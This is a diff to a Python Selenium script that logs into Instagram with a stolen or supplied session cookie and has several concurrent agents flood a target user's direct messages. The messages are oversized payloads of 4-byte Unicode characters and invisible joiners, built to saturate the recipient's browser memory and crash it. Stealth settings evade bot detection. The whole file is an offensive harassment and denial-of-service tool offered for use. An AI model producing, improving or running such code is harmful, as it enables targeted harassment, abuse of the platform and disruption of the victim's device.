@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER.OWNS (FIREFOX-KILLER V48)
-# 📅 STATUS: HEAP-SATURATION | 4-AGENT TOTAL | AWS-HARD-CRASH
+# 🚀 PROJECT: PRAVEER.OWNS (DIRECT-DISPATCH V49)
+# 📅 STATUS: UI-QUEUE-BYPASS | 4-AGENT TOTAL | AWS-CPU-STRIKE
 
 import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
 from concurrent.futures import ThreadPoolExecutor
@@ -12,30 +12,27 @@ from selenium.webdriver.chrome.options import Options
 # --- 4 AGENTS TOTAL CONFIG ---
 AGENTS_PER_MACHINE = 2             
 TOTAL_DURATION = 25000 
-BURST_SPEED = (0.05, 0.1)   # 🔥 Maximum Velocity
-REST_AFTER_STRIKES = 150   
-REST_DURATION = 2          
+BURST_SPEED = (0.2, 0.4)    
+REST_AFTER_STRIKES = 100   
+REST_DURATION = 5          
 
 GLOBAL_SENT = 0
 COUNTER_LOCK = threading.Lock()
 BROWSER_LAUNCH_LOCK = threading.Lock()
 
-def get_firefox_killer_payload():
-    """Generates a high-byte surrogate payload to fragment the browser heap."""
+def get_dispatch_payload():
+    """Generates a high-authority visible payload designed for 32GB RAM saturation."""
     u_id = random.randint(100, 999)
-    # 𒀱 = Cuneiform (4 bytes) | 🌙 = Moon (4 bytes) | 𝕻 = Fraktur (4 bytes)
-    # Mixing these prevents Firefox's 'String Deduplication'
-    heavy = ["𒀱", "🌙", "𝕻", "𝙰"]
-    glue = "\u2060" # Word Joiner (Invisible)
+    # \u2060 = Word Joiner | \u200D = ZWJ | \u2068 = Isolate
+    glue, zwj, iso, pop = "\u2060", "\u200D", "\u2068", "\u2069"
     
-    header = f"👑 PRAVEER PAPA ON TOP 🌙 [HEAP_LOCK:{u_id}]"
+    header = f"👑 PRAVEER PAPA ON TOP 🌙 [DISPATCH_ID:{u_id}]"
     
     body = []
-    # 400 lines of unique, high-byte memory allocations
-    for i in range(400):
-        random.shuffle(heavy)
-        # We bond high-byte chars to ensure Firefox can't compress the string
-        line = f"PRAVEER PAPA ON TOP 🌙 {''.join(heavy * 6)} {i}{glue*8}"
+    # 380 lines of unique, high-plane memory triggers
+    for i in range(380):
+        # Mixing 4-byte Fraktur and standard text to break memory compression
+        line = f"{iso}PRAVEER PAPA ON TOP 🌙 {zwj} 𝕻{i}{pop}{glue*12}"
         body.append(line)
         
     return f"{header}\n{glue.join(body)}".strip()[:9995]
@@ -46,7 +43,9 @@ def get_driver(agent_id):
         chrome_options.add_argument("--headless=new") 
         chrome_options.add_argument("--no-sandbox") 
         chrome_options.add_argument("--disable-dev-shm-usage")
-        chrome_options.add_argument("--disable-gpu") # Keep YOUR bot light
+        # 🛡️ THE FIX: Disable EVERYTHING that renders on your side
+        chrome_options.add_argument("--disable-gpu")
+        chrome_options.add_argument("--blink-settings=imagesEnabled=false")
         
         ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
         chrome_options.add_argument(f"user-agent={ua}")
@@ -55,21 +54,29 @@ def get_driver(agent_id):
         stealth(driver, languages=["en-US"], vendor="Google Inc.", platform="Win32", fix_hairline=True)
         return driver
 
-def atomic_send(driver, text):
-    """Bypasses UI lag by forcing a direct DOM 'Enter' event."""
+def direct_dispatch_send(driver, text):
+    """Bypasses the 'Typing' lag by using a Frame-Synchronized JS event."""
     try:
         driver.execute_script("""
             var box = document.querySelector('div[role="textbox"], textarea');
             if (box) {
-                box.focus();
-                document.execCommand('insertText', false, arguments[0]);
-                // Fire Native Input Event for Instagram State
-                box.dispatchEvent(new Event('input', { bubbles: true }));
-                // Fire Enter Key
-                var e = new KeyboardEvent('keydown', {
-                    key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true
+                // Use requestAnimationFrame to ensure the CPU is 'ready' to send
+                window.requestAnimationFrame(() => {
+                    box.focus();
+                    document.execCommand('selectAll', false, null);
+                    document.execCommand('delete', false, null);
+                    document.execCommand('insertText', false, arguments[0]);
+                    
+                    // Trigger Internal Framework State
+                    box.dispatchEvent(new Event('input', { bubbles: true }));
+                    
+                    // Fire Native Keyboard Event
+                    var e = new KeyboardEvent('keydown', {
+                        key: 'Enter', code: 'Enter', keyCode: 13, which: 13, 
+                        bubbles: true, cancelable: true
+                    });
+                    box.dispatchEvent(e);
                 });
-                box.dispatchEvent(e);
             }
         """, text)
         return True
@@ -82,26 +89,27 @@ def run_life_cycle(agent_id, cookie, target):
             driver.get("https://www.instagram.com/")
             driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
             driver.get(f"https://www.instagram.com/direct/t/{target}/")
-            time.sleep(12) 
+            time.sleep(15) 
             
             strike_count = 0
             while True:
-                payload = get_firefox_killer_payload()
-                if atomic_send(driver, payload):
+                payload = get_dispatch_payload()
+                if direct_dispatch_send(driver, payload):
                     strike_count += 1
                     with COUNTER_LOCK:
                         global GLOBAL_SENT
                         GLOBAL_SENT += 1
-                    print(f"Agent {agent_id}: Heap-Strike ({GLOBAL_SENT})")
+                    print(f"Agent {agent_id}: Dispatch-Strike ({GLOBAL_SENT})")
                     
-                    if strike_count % 80 == 0:
+                    if strike_count % 60 == 0:
                         driver.refresh()
-                        time.sleep(5)
+                        time.sleep(8)
+                
                 time.sleep(random.uniform(*BURST_SPEED))
         except: pass
         finally:
             if driver: driver.quit()
-            time.sleep(2)
+            time.sleep(5)
 
 def main():
     cookie = os.environ.get("INSTA_COOKIE", "").strip()
